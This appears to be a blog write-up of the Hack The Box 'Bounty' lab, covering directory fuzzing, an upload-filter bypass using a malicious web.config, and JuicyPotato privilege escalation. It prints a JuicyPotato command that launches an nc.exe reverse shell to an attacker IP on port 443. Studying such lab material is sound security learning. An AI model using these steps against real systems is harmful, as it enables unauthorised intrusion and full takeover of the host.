---

title: "Bounty"
date: 2023-08-10T11:30:03+00:00
tags: ["web","windows","JuicyPotato"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: "/HTB/Bounty.png"
comments: false
description: "This is a friendly windows machine that is vulnerable because has a bad configuration of directories."

---

## Room Information

- Room name: Bounty
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/bounty

![Untitled](/HTB/Bounty.png)

## Tools Used

- Nmap
- searchsploit
- smbclient
- JuicyPotato
- wfuzz
- gobuster

## Port Scanning

Other room, other port scan.

![Untitled](/HTB/targeted-bounty.png)

As you can see there’s only one open port: port 80 (http). So let’s focus on them.

## Enumeration

As I always do with all machines I set out to do the directory scan with **gobuster** and **wfuzz,** and I find some things:

pd: a photo of the website

![Untitled](/HTB/web-bounty.png)

The scans I did:

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -z list,aspx-asp-txt  http://10.10.10.93/FUZZ.FUZ2Z
```

I found the **/transfer.aspx** file … 

![Untitled](/HTB/aspx-bounty.png)

![Untitled](/HTB/upload-bounty.png)

My first idea was to upload a reverse shell in .exe or .**aspx** or .asp, but I soon realized that most of the potentially dangerous extensions were patched, so I decided to see which ones were not. As there were so many tests I had to do, I automated it with **BurpSuite** and passed it a dictionary of extensions that I searched for on **github**.

![Untitled](/HTB/burp1-bounty.png)


![Untitled](/HTB/burp2-bounty.png)

I found several, but among them the **.config** extension caught my attention, since it seemed to me that I could execute **aspx** code inside it. The next thing I did was to search in google for some kind of reverse shell with this extension and I found a post in **github** that explained it perfectly, I only had to change a few things and that was it.

SNow I needed to see where to save the file I uploaded, so I started to discover directories with **wfuzz** and **gobuster** like crazy until I found it.

pd: the directory is called **/UploadFiles/**

![Untitled](/HTB/folder-bounty.png)

## Exploiting

So once I have discovered the directory where the files I upload are stored, all that remains is to upload the web.config exploit and run it. This exploit would be in charge of downloading and executing another exploit that would start a reverse shell to the ip and port that we have previously modified. It is necessary to say that apart from having a server mounted in port 80 in my machine I also put myself in listening in the port that I specified the 443, to receive there the reverse shell.

![Video demostration of how to pwn the machine.](/HTB/pwn-bounty.gif)


So  at this point I was in  😇

## Escalating Privileges

I was user **merlin** so as always I went to the desktop folder to see the flag, but in this case was ocult, so I searched on google what could I do, and I did this → `dir -force`

![Untitled](/HTB/dir-bounty.png)

Then I did as always a `whoami /priv`

![Untitled](/HTB/priv-bounty.png)

And I saw that this machine is vulnerable to a `JuicyPotato`  attack, so I could escalate privileges.

So as I already did this on past machines I searched my system with `find / -name "JuicyPotato.exe" 2>/dev/null`, the file `nc.exe` and the `JuicyPotato.exe`, and I moved it to the victim machine thanks to the smbserver that I created with the `smbserver.py` tool.

![Untitled](/HTB/dir2-bounty.png)

Then I execute this command and 

```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.11 443"
```

Then I listened on port 443, executed this command and received the reverse shell as root user 😎

![Untitled](/HTB/root-bounty.png)

## Lessons Learned

- What insights did you gain from the room?
    
    I learn more about **.config**, and brute force with **burpsuite**.
    
- Where there any novel tools or techniques employed?
    
    Using **BurpSuite** as brute force machine.
